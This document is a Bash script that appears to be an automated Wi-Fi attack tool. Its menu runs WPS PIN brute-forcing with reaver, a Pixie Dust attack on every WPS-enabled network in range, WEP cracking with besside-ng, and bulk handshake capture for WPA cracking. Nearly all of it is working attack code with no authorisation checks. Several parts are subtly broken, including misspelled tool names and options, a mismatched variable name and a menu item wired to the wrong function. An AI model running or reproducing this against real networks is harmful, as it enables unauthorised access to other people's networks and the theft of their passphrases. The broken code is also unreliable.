#!/bin/bash

ICARD=""
REPLY=""

declare -A Str1
Str1="\033[1mThere is no wireless interface on your system. Exit.\e[0m"

declare -A Str2
Str2="\033[1mThere is one wireless interface on your system. Automatically Selected\e[0m"

declare -A Str3
Str3="\033[1mAvailable wireless interfaces]"

declare -A Str4
Str4="Enter the number corresponding to the selected interface: "

declare -A Str5
Str5="Error. There is no selected wireless interface. Start from interface selection"

declare -A Str6
Str6="Checking to solve possible \"bad FCS\" problem if exists. Parameterizing..."

declare -A Str7
Str7="\033[1mLooking for Wi-Fi networks with WPS enabled\e[0m"

declare -A Str8
Str8="\033[1mAutomatic attack Pixie Dust againts WPS enabled Wi-Fi network\e[0m"

declare -A Str9
Str9="Enter the aim number: "

declare -A Str10
Str10="You selected:"

declare -A Str11
String11="Start attack"

declare -A Str12
Str12="Processing"

declare -A Str13
Str13="\033[0;31mPIN is found, trying WAP passphrase: \e[0m"

declare -A Str14
Str14="Discovered WPS enabled Wi-fi networks: "

declare -A Str15
Str15="Fail"

declare -A Str16
Str16="\033[0;31mWPS enabled Wifi networks are not found\e[0m"

declare -A Str17
Str17="\033[1mLooking for open wifi netowrks\e[0m"

declare -A Str18
Str18="\033[0;32mDiscovered open wifi networks\e[0m"

declare -A Str19
Str19="\033[0:31mOpen wifi networks are not found\e[0m"

declare -A Str20
Str20="\033[1mLooking for wifi networks with WEP encryption\e[0m"

declare -A Str21
Str21="Discovered wifi networks with WEP encryption: "

declare -A Str22
Str22="\033[0;32mCracked wifi networks with WEP: \e[0m"

declare -A Str23
Str23="\033[0;32mKey: \e[0m"

declare -A Str24
Str24="\033[0;31mWi-Fi networks with WEP encryption are not found\e[0m"

declare -A Str25
Str25="\033[1mCollecting handshakes from every Wi-Fi network in range\e[0m"

declare -A Str26
Str26="Analyze collected handshakes:"

declare -A Str27
Str27="Selected wireless interface "

declare -A Str28
Str28=". Mode: "

declare -A Str29
Str29="Wireless interface still is not selected"

declare -A Str30
Str30="Enter the number corresponding to the selected menu item: "

declare -A Str31
Str31="The script is over."

function selectInterface {
  clear
  COUNTER=0

  while read -r line ; do
    DEVS[$COUNTER]=$line
    COUNTER=$((COUNTER+1))
  done < <(sudo iw dev | grep -E "Interface " | sed "s/     Interface //")

  if [[ ${#DEVS[@]} == 0 ]]; then
    echo -e ${Str1}
    exit
  fi

  if [[ ${#DEVS[@]} == 1 ]]; then
    echo -e ${Str2}
    ICARD=${DEVS[0]}
  fi

  if [[ ${#DEVS[@]} -gt 1 ]]; then
    COUNTER=0
    echo ${Str3}
    for i in "${DEVS[@]}";
    do
      echo "$((COUNTER+1)).${DEVS[COUNTER]}"
      COUNTER=$((COUNTER+1))
    done
    read -p "${Str4}" INTNUM
    ICARD=${DEVS[$((INTNUM-1))]}
  fi
  if [ $REPLY -eq 9 ]; then
    echo "============================================="
  else
    REPLY=""
    showMainMenu
  fi
}

function pushInMonitorMode {
  if [[ "$ICARD" ]]; then
    clear
    sudo ip link set "$ICARD" down && sudo iw "$ICARD" set monitor control && sudo ip link set "$ICARD" up
    REPLY=""
    showMainMenu
  else
    INF=${Str5}
    REPLY=""
    showMainMenu
  fi
}

function pushInManagedMode {
  if [[ "$ICARD" ]]; then
    clear
    sudo ip link set "$ICARD" down && sudo iw "$ICARD" set type managed && sudo ip link set "$ICARD" up
    sudo systemctl start NetworkManager
    REPLY=""
    showMainMenu
  else
    INF=${Str5}
    REPLY=""
    showMainMenu
  fi
}

function pushInMonitorModePlus {
  if [[ "$ICARD" ]]; then
    clear
    sudo systemctl stop NetworkManager
    sudo airmon-ng check kill
    sudo ip link set "$ICARD" down && sudo iw "$ICARD" set monitor control && sudo ip link set "$ICARD" up

    if [ $REPLY -eq 9 ]; then
      echo "========================================"
    else
      REPLY=""
      showMainMenu
    fi
  else
    INF=${Str5}
    REPLY=""
    showMainMenu
  fi
}

function set_wash_parametrization {
  fcs=""
  readarray -t WASH_OUTPUT < <(timeout -s SIGTERM 2 wash -i "$ICARD" 2> /dev/null)

  for item in "${WASH_OUTPUT[@]}"; do
    if [[ ${item} =~ ^\[\!\].*bad[[:space:]]FCS ]]; then
      fcs="-C"
      break
    fi
  done
}

function showWPSNetworks {
  echo ${Str6}
  set_wash_parametrization
  echo -e ${Str7}
  if [[ "$ICARD" ]]; then
    sudo xterm -geometry "150x50+50+0" -e "sudo wash -i $ICARD $fcs | tee /tmp/wash.all"
    echo -e 'Number\tBSSID                    Channel            RSSI       WPS Version          WPS Locked                ESSID'
    echo '----------------------------------------------------------------------------------------------------------------------'
    cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | cat -b
    read -p "${Str9}" AIM
    echo ${Str10}
    cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM"
    echo ${Str11}

    sudo iw dev "$ICARD" set channel "$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $2}')"

    sudo xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $ICARD -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}') -e \"$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $6}')\"" &
    sudo xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo reaver -i $ICARD -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}') -v --no-nacks"
   else
     INF=${Str5}
     REPLY=""
     showMainMenu
   fi
   if [ $REPLY -eq 9 ]; then
     echo "=============================================="
   else
     REPLY=""
     showMainMenu
   fi
}

function PixieDustAttack {
  echo ${Str6}
  set_wash_parametrization

  echo -e ${Str8}
  if [[ "$ICARD" ]]; then
    sudo timeout 120 xterm -geometry "150x50+50+0" -e "sudo wash -i $ICARD $fcs | tee /tmp/wash.all"
    FOUNDWPS=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | cat -b)
    if [[ "$FOUNDWPS" ]]; then
      echo ${Str14}
      echo -e 'Number\tBSSID                    Channel               RSSI           WPS Version            WPS Locked           ESSID'
      echo '--------------------------------------------------------------------------------------------------------------------------'
      cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | cat -b

      COUNTER=0
      while read -r line ; do
        WPSS[$COUNTER]=$line
        COUNTER=$((COUNTER+1))
      done < <(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk '{print $1}' | sed 's/,//')

      for i in "${WPSS[@]}";
      do
        echo ${Str12}"$i"
        echo ${Str11}
        sudo iw dev "$ICARD" set channel "$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $2}')"

        sudo timeout 298 xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $ICARD -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}') -e \"$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $6}')\"" &
        sudo timeout 300 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo reaver -i $ICARD -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}') -v --no-nacks -K 1 | tee /tmp/reaver.pixiedust"

        PIN=$(cat /tmp/reaver.pixiedust | grep -E '\[\+\] WPS pin:' | grep -Eo '[0-9]{8}')

        if [[ "$PIN" ]]; then
          echo -e ${Str13}"$PIN"
          sudo timeout 120 xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $ICARD -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}') -e \"$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $6}')\"" &
          sudo timeout 120 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo reaver -i $ICARD -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}') -v --no-nacks -p $PIN | tee /tmp/reaver.wpa"

          cat /tmp/reaver.wpa | grep -E "\[\+\] WPS pin: "
          cat /tmp/reaver.wpa | grep -E "WPA"
          rm /tmp/reaver.wpa

        else
          echo ${Str15}

        fi
      done
    else
      echo -e ${Str16}
    fi
    if [ $REPLY -eq 9 ]; then
      echo "============================================================="
    else
      REPLY=""
      showMainMenu
    fi

  else
    INF=${Str5}
    REPLY=""
    showMainMenu
  fi
}

function showOpen {
  if [[ "$ICARD" ]]; then
    echo -e ${Str17}
    sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo ariodump-ng -i $ICARD -t OPN -w /tmp/openwifinetworks --output-forma csv"
    NOPASS=$(cat /tmp/openwifinetworks-01.csv | grep -E ' OPN,')
    if [[ "$NOPASS" ]]; then
      echo -e ${Str18}
      cat /tmp/openwifinetworks-01.csv | grep -E ' OPN,' | awk '{print $19}'| sed 's/,//' | cat -b
    else
      echo -e ${Str19}
    fi

    sudo rm /tmp/openwifinetworks*
    if [ $REPLY -eq 9 ]; then
      echo "=================================================================="
    else
      REPLY=""
      showMainMenu
    fi
  else
    INF=${Str5}
    REPLY=""
    showMainMenu
  fi
}

function attackWEP {
  if [[ "$ICARD" ]]; then
    echo -e ${Str20}
    sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng -i $ICARD -t WEP -w /tmp/wepwifinetworks --output-forma csv"
    WEP=$(cat /tmp/wepwifinetworks-01.csv | grep -E ' WEP,')
    if [[ "$WEP" ]]; then
      echo ${Str21}
      cat /tmp/wepwifinetworks-01.csv | grep -E 'WEP,' | awk '{print $19}' | sed 's/,//' | cat -b

      COUNTER=0
      while read -r line ; do
        WEPS[$COUNTER]=$line
        COUNTER=$((COUNTER+1))
      done < <(cat /tmp/wepwifinetworks-01.csv | grep -E ' WEP,' | awk '{print $1}' | sed 's/,//')

      for i in "${WEPS[@]}";
      do
        echo ${Str12}"$i";
        cd /tmp
        sudo timeout 600 xterm -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo besside-ng $ICARD -b $i -c $(cat /tmp/wepwifinetworks-01.csv | grep -E $i | awk '{print $6}' | sed 's/,//')"
        WEPCracked=$(cat /tmp/besside.log | grep -E '[A-Fa-f0-9:]{11}')
        if [[ "$WEPCracked" ]]; then
          echo -e ${Str22}$(cat /tmp/wepwifinetworks-01.csv | grep -E $i | awk '{print $1}' | sed 's/,//')"\e[0m"
          echo -e ${Str23}$(cat /tmp/besside.log | grep -E '[A-Fa-f0-9:]{11}' | awk '{print $3}' | sed 's/,//')
          rm /tmp/besside.logout
          rm /tmp/wpa.cap
          rm /tmp/wep.cap

        else
          echo ${Str15}
        fi
        cd
      done
    else
      echo -e ${Str24}
    fi
    sudo rm /tmp/wepwifinetworks*
    if [ $REPLY -eq 9 ]; then
      echo "======================================================="
    else
      REPLY=""
      showMainMenu
    fi
  else
    INF=${Str5}
    REPLY=""
    showMainMenu
  fi
}

function getAllHandshakes {
  if [[ "$ICARD" ]]; then
    echo -e ${Str25}
    sudo timeout 1200 xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo airodump-ng $ICARD 30000 -w autopwner --berlin 1200" &
    sudo timeout 1200 xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo zizzania -i $ICARD"

    echo ${Str26}
    sleep 1
    sudo pyrit -r "$(ls | grep -E autopwn | grep -E cap | tail -n 1)" analyze

    if [ $REPLY -eq 9 ]; then
      echo "==========================================================="
      REPLY=""
      showMainMenu
    fi
  else
    INF=${Str5}
    REPLY=""
    showMainMenu
  fi
}

clear
COUNTER=0

while read -r line ; do
  DEVS[$COUNTER]=$line
  COUNTER=$((COUNTER+1))

done < <(sudo iw dev | grep -E "Interface " | sed "s/      Interface //")

if [[ ${#DEVS[@]} == 1 ]]; then
  echo -e ${Str2}
  ICARD=${DEVS[0]}
fi

function showMainMenu {
  if [[ "$ICARD" ]]; then
    INF=${Str27}$ICARD

    while read -r line ; do
    INF=${INF}${Str28}${line}
  done < <(sudo iw dev | grep -E -A5 "Interface $ICARD" | grep -E "type " | sed "s/                      type //")
else
  INF=${Str29}
fi

cat << _EOF_
Infomation:
$INF
Menu:
1. Select an interface to work with
2. Put interface in monitor mode
3. Put interface in monitor mode + kill processes hindering it + kill NetworkManager
4. Show Open Wi-Fi networks
5. WEP Attack
6. WPS Attack
7. Pixie Dust Attack (against every APs with WPS)
8. WPA2/WPA Attack
9. Run all but WPS Attack
10. Put interface in managed mode

0. Exit
_EOF_

read -p "$Str30" REPLY

if [[ $REPLY =~ ^[0-9]$ ]]; then
  if [[ $REPLY == 0 ]]; then
    echo ${Str31}
    exit

  fi
fi

if [[ $REPLY == 1 ]]; then
  selectInterface
fi

if [[ $REPLY == 2 ]]; then
  pushInMonitorMode
fi

if [[ $REPLY == 3 ]]; then
  pushInMonitorMode
fi

if [[ $REPLY == 4 ]]; then
  showOpen
fi

if [[ $REPLY == 5 ]]; then
  attackWEP
fi

if [[ $REPLY == 6 ]]; then
  showWPSNetworks
fi

if [[ $REPLY == 7 ]]; then
  PixieDustAttack
fi

if [[ $REPLY == 8 ]]; then
  getAllHandshakes
fi

if [[ $REPLY == 9 ]]; then
  pushInMonitorModePlus
  showOpen
  attackWEP
  PixieDustAttack
  getAllHandshakes
fi

if [[ $REPLY == 10 ]]; then
  pushInManagedMode
fi

}

showMainMenu
